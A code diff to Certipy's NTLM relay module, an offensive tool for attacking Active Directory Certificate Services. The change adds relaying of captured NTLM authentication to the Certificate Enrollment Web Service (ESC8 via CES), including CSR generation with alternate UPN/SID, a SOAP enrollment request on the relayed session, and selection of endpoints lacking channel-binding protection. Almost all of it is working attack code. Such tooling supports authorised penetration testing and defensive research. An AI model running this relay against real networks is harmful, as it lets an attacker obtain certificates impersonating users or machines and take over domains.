@@ -19,12 +19,13 @@ Key Components:
 
 import argparse
 import base64
+import json
 import os
 import struct
 import time
 from struct import unpack
 from threading import Lock
-from typing import Any, List, Literal, Optional, Tuple, Union, cast
+from typing import Any, Dict, List, Literal, Optional, Tuple, Union, cast
 
 import bs4
 import httpx
@@ -49,8 +50,15 @@ from certipy.lib.certificate import (
     csr_to_pem,
     der_to_cert,
 )
+from certipy.lib.ces import (
+    SOAP_CONTENT_TYPE,
+    CESError,
+    build_wstep_request,
+    default_ces_path,
+    parse_wstep_response,
+)
 from certipy.lib.constants import OID_TO_STR_NAME_MAP, USER_AGENT
-from certipy.lib.errors import handle_error
+from certipy.lib.errors import handle_error, translate_error_code
 from certipy.lib.logger import logging
 from certipy.lib.ntlm import NtlmNotSupportedError
 from certipy.lib.req import (
@@ -441,6 +449,11 @@ class ADCSHTTPAttackClient(ProtocolAttack):
             )
             return
 
+        # Relay into the Certificate Enrollment Web Service (MS-WSTEP)
+        if self.adcs_relay.ces:
+            self._request_certificate_ces()
+            return
+
         # Handle template enumeration mode
         if self.adcs_relay.enum_templates:
             self._enumerate_templates()
@@ -591,6 +604,136 @@ class ADCSHTTPAttackClient(ProtocolAttack):
                 self.adcs_relay.out,
                 self.adcs_relay.pfx_password,
             )
+
+        return self.finish_run()
+
+    def _request_certificate_ces(self) -> None:
+        """
+        Request a new certificate for the relayed user via CES (MS-WSTEP).
+
+        Builds an MS-WSTEP RequestSecurityToken SOAP envelope and POSTs it on
+        the already NTLM-authenticated relayed session, then saves any
+        issued certificate.
+        """
+        # Validate username before proceeding — an empty username from the
+        # NTLM response will cause CSR generation to fail if no explicit
+        # subject DN was provided.
+        if not self.username and not self.adcs_relay.subject:
+            logging.error(
+                "Relayed NTLM authentication returned an empty username "
+                f"(authenticated as {self.client.user!r}). "
+                "Cannot generate CSR without a valid subject. "
+                "Use '-subject CN=<target>' to specify an explicit subject DN."
+            )
+            return
+
+        if self.adcs_relay.archive_key:
+            logging.warning(
+                "Key archival (-archive-key) is not supported over CES; ignoring"
+            )
+
+        ces_to_url = self.adcs_relay.ces_to_url
+        if ces_to_url is None:
+            logging.error("CES target URL is not set")
+            return self.finish_run()
+
+        # Choose appropriate template based on username
+        template = self.config.template
+        if template is None:
+            template = "Machine" if self.username.endswith("$") else "User"
+
+        # Generate certificate signing request
+        csr, key = create_csr(
+            self.username,
+            alt_dns=self.adcs_relay.alt_dns,
+            alt_upn=self.adcs_relay.alt_upn,
+            alt_sid=self.adcs_relay.alt_sid,
+            subject=self.adcs_relay.subject,
+            key_size=self.adcs_relay.key_size,
+            application_policies=self.adcs_relay.application_policies,
+            smime=self.adcs_relay.smime,
+        )
+        csr_der = csr_to_der(csr)
+
+        # Build certificate attributes
+        attributes = create_csr_attributes(
+            template,
+            alt_dns=self.adcs_relay.alt_dns,
+            alt_upn=self.adcs_relay.alt_upn,
+            alt_sid=self.adcs_relay.alt_sid,
+        )
+
+        body = build_wstep_request(ces_to_url, csr_der, attributes)
+
+        logging.info(
+            f"Requesting certificate for {self.client.user} based on the template {template!r}"
+        )
+
+        # Certificate issuance can take significantly longer than the NTLM
+        # auth handshake, so use an extended timeout for the POST request.
+        # Use at least 60 seconds, or the session's configured read timeout
+        # if larger.
+        # A disabled session timeout (None) is preserved.
+        session_read_timeout = self.client.timeout.read
+        cert_request_timeout = (
+            None if session_read_timeout is None else max(session_read_timeout, 60)
+        )
+
+        # Use the raw (percent-encoded) path rather than the decoded `.path`
+        # — a CA name containing a space would otherwise be re-encoded
+        # incorrectly when sent on the wire.
+        path = httpx.URL(ces_to_url).raw_path.decode()
+
+        try:
+            res = self.client.post(
+                path,
+                content=body,
+                headers={"Content-Type": SOAP_CONTENT_TYPE},
+                timeout=cert_request_timeout,
+            )
+        except httpx.ReadTimeout:
+            logging.error(
+                f"Certificate request timed out after {cert_request_timeout}s waiting for "
+                "CES to respond. The CA may be slow or under load. "
+                "Try increasing the timeout with '-timeout <seconds>' (e.g., -timeout 120)"
+            )
+            return self.finish_run()
+        except Exception as e:
+            logging.error(f"Error during CES certificate request: {e}")
+            handle_error()
+            return self.finish_run()
+
+        if res.status_code == 401:
+            logging.error("Relayed CES request was unauthorized")
+            return self.finish_run()
+
+        try:
+            response = parse_wstep_response(res.content)
+        except CESError as e:
+            if e.error_code is not None:
+                logging.error(f"CES error: {translate_error_code(e.error_code)}")
+            request_id_msg = (
+                f" (request ID {e.request_id})" if e.request_id is not None else ""
+            )
+            logging.error(f"CES returned an error: {e}{request_id_msg}")
+            return self.finish_run()
+
+        if response.certificate is None:
+            logging.warning(
+                "CES did not return a certificate "
+                f"(disposition {response.disposition_message!r})"
+            )
+            return self.finish_run()
+
+        handle_request_response(
+            response.certificate,
+            key,
+            self.client.user,
+            self.adcs_relay.subject,
+            self.adcs_relay.alt_sid,
+            self.adcs_relay.out,
+            self.adcs_relay.pfx_password,
+        )
 
         return self.finish_run()
 
@@ -810,6 +953,71 @@ class ADCSRPCAttackClient(ProtocolAttack):
             self.adcs_relay.shutdown()
 
 
+def select_ces_endpoint(find_data: Dict[str, Any], ca: Optional[str] = None) -> str:
+    """
+    Choose the relayable CES endpoint from `certipy find -json` output.
+
+    An endpoint is relayable when it accepts Negotiate (Kerberos auth type,
+    which also accepts NTLM), does not enforce EPA, and was not found
+    unreachable. Endpoints that were not probed (DC-only mode) are kept.
+
+    Args:
+        find_data: Parsed JSON written by `certipy find -json`
+        ca: Optional CA name to choose between several relayable endpoints
+
+    Returns:
+        URL of the single relayable CES endpoint
+
+    Raises:
+        ValueError: If no endpoint, or more than one, is relayable
+    """
+    cas = find_data.get("Certificate Authorities") or {}
+    ca_entries = list(cas.values()) if isinstance(cas, dict) else list(cas)
+
+    if ca is not None:
+        ca_entries = [
+            entry
+            for entry in ca_entries
+            if str(entry.get("CA Name", "")).lower() == ca.lower()
+        ]
+        if not ca_entries:
+            raise ValueError(f"CA {ca!r} not found in find output")
+
+    relayable: List[Tuple[str, str]] = []
+    rejected: List[str] = []
+    for entry in ca_entries:
+        ca_name = str(entry.get("CA Name", "?"))
+        for endpoint in entry.get("Enrollment Web Service") or []:
+            if not isinstance(endpoint, dict) or not endpoint.get("uri"):
+                continue
+
+            uri = str(endpoint["uri"])
+            if "Kerberos" not in (endpoint.get("auth") or []):
+                rejected.append(f"{uri}: does not accept NTLM (Negotiate)")
+            elif endpoint.get("channel_binding") is True:
+                rejected.append(f"{uri}: EPA (channel binding) is enforced")
+            elif endpoint.get("reachable") is False:
+                rejected.append(f"{uri}: not reachable when find ran")
+            else:
+                relayable.append((ca_name, uri))
+
+    if not relayable:
+        if not rejected:
+            raise ValueError("No CES endpoints published in find output")
+        raise ValueError(
+            "No relayable CES endpoint in find output: " + "; ".join(rejected)
+        )
+
+    if len(relayable) > 1:
+        listing = "; ".join(f"{name}: {uri}" for name, uri in relayable)
+        raise ValueError(
+            "Multiple relayable CES endpoints; choose one with -ca or pass it as "
+            f"-target: {listing}"
+        )
+
+    return relayable[0][1]
+
+
 class Relay:
     """
     Main class for orchestrating NTLM relay attacks against AD CS.
@@ -820,7 +1028,7 @@ class Relay:
 
     def __init__(
         self,
-        target: str,
+        target: Optional[str] = None,
         ca: Optional[str] = None,
         template: Optional[str] = None,
         upn: Optional[str] = None,
@@ -840,13 +1048,17 @@ class Relay:
         no_skip: bool = False,
         timeout: int = 5,
         enum_templates: bool = False,
+        ces: bool = False,
+        find_json: Optional[str] = None,
         **kwargs,  # type: ignore
     ):
         """
         Initialize the NTLM relay attack.
 
         Args:
-            target: Target AD CS server (http://server/certsrv/ or rpc://server)
+            target: Target AD CS server (http://server/certsrv/, rpc://server, or with
+                -ces https://server/<CA>_CES_<Auth>/service.svc/CES); optional with
+                -ces -json
             ca: Certificate Authority name (required for RPC)
             template: Certificate template to request
             upn: Alternative UPN (User Principal Name)
@@ -866,10 +1078,10 @@ class Relay:
             no_skip: Don't skip already attacked targets
             timeout: Connection timeout in seconds
             enum_templates: Enumerate available templates instead of requesting certificate
+            ces: Relay to a CES endpoint; target is kept verbatim as the CES URL
+            find_json: Path to 'certipy find -json' output used to pick the CES target (with -ces)
             kwargs: Additional arguments
         """
-        self.target = target
-        self.base_url = target  # Used only for HTTP(S) targets
         self.ca = ca
         self.template = template
         self.alt_upn = upn
@@ -887,6 +1099,8 @@ class Relay:
         self.interface = interface
         self.port = port
         self.enum_templates = enum_templates
+        self.ces = ces
+        self.ces_to_url: Optional[str] = None
         self.kwargs = kwargs
         self.key: Optional[rsa.RSAPrivateKey] = None
 
@@ -902,13 +1116,74 @@ class Relay:
         self.attacked_targets = []
         self.attack_lock = Lock()
 
+        if find_json and not ces:
+            logging.error("-json is only supported with -ces")
+            exit(1)
+
+        if ces and find_json:
+            try:
+                resolved = self._ces_target_from_find(target, find_json, ca)
+            except (OSError, ValueError) as e:
+                logging.error(f"Could not choose a CES target from {find_json!r}: {e}")
+                exit(1)
+            logging.info(f"Using CES endpoint from find output: {resolved}")
+            target = resolved
+
+        if not target:
+            logging.error("A target is required (-target), or use -ces with -json")
+            exit(1)
+
+        self.target: str = target
+        self.base_url: str = target  # Used only for HTTP(S) targets
+
         # Configure target based on URL or RPC string
         if self.target.startswith("rpc://"):
+            if self.ces:
+                logging.error("-ces requires an https:// CES URL target, not rpc://")
+                exit(1)
+
             if ca is None:
                 logging.error("A certificate authority is required for RPC attacks")
                 exit(1)
 
             logging.info(f"Targeting {target} (ESC11)")
+        elif self.ces:
+            if self.request_id or self.enum_templates:
+                logging.error(
+                    "-retrieve and -enum-templates are not supported with -ces"
+                )
+                exit(1)
+
+            try:
+                self.base_url, self.ces_to_url, path = self._build_ces_target(
+                    self.target
+                )
+            except ValueError:
+                logging.error(
+                    f"Invalid CES target URL: {self.target!r}. Expected "
+                    "https://host/<CA>_CES_<Auth>/service.svc/CES"
+                )
+                exit(1)
+
+            # A bare host has no CES path; relaying to "/" never gets an NTLM
+            # challenge, so derive the default endpoint from the CA name instead
+            if path == "/":
+                if not ca:
+                    logging.error(
+                        f"CES target {self.target!r} has no endpoint path. Pass the "
+                        "full CES URL (see 'Enrollment Web Service' in 'certipy find') "
+                        "or the CA name with -ca"
+                    )
+                    exit(1)
+                self.ces_to_url = f"{self.base_url}{default_ces_path(ca)}"
+                logging.warning(
+                    f"Assuming the default CES endpoint {self.ces_to_url!r}. CES may "
+                    "use another host, name, or auth type; use -json or the "
+                    "URL from 'certipy find' to target the published endpoint"
+                )
+
+            self.target = self.ces_to_url
+            logging.info(f"Targeting {self.target} (ESC8 - CES)")
         else:
             # Format HTTP target URL
             if not self.target.startswith("http://") and not self.target.startswith(
@@ -971,6 +1246,63 @@ class Relay:
         config.setMode("RELAY")
 
         self.server = SMBRelayServer(config)
+
+    @staticmethod
+    def _ces_target_from_find(
+        target: Optional[str], find_json: str, ca: Optional[str]
+    ) -> str:
+        """
+        Resolve the CES target using 'certipy find -json' output.
+
+        An explicit CES URL in target wins and the file is not read. A bare host
+        keeps the path find reported but connects to the host the operator gave.
+        """
+        if target and Relay._build_ces_target(target)[2] != "/":
+            return target
+
+        with open(find_json, encoding="utf-8") as f:
+            data = json.load(f)
+        if not isinstance(data, dict):
+            raise ValueError("not a 'certipy find -json' file")
+
+        uri = select_ces_endpoint(data, ca)
+        if not target:
+            return uri
+        base_url = Relay._build_ces_target(target)[0]
+        return base_url + httpx.URL(uri).raw_path.decode()
+
+    @staticmethod
+    def _build_ces_target(target: str) -> Tuple[str, str, str]:
+        """
+        Parse a CES target URL, keeping its path verbatim.
+
+        Args:
+            target: CES URL, with or without a scheme (https is assumed if omitted)
+
+        Returns:
+            Tuple of (base_url, to_url, path), where base_url is scheme://host[:port],
+            to_url is the full URL and path is the URL path
+
+        Raises:
+            ValueError: If the target is empty, malformed, has no host, or uses a
+                scheme other than http or https
+        """
+        if "://" not in target:
+            target = f"https://{target}"
+
+        try:
+            url = httpx.URL(target)
+        except httpx.InvalidURL as e:
+            raise ValueError(f"Invalid CES target URL: {target!r}") from e
+
+        if url.scheme not in ("http", "https") or not url.host:
+            raise ValueError(f"Invalid CES target URL: {target!r}")
+
+        base_url = f"{url.scheme}://{url.host}"
+        if url.port is not None:
+            base_url += f":{url.port}"
+
+        return base_url, str(url), url.path or "/"
 
     @property
     def request(self) -> Request:
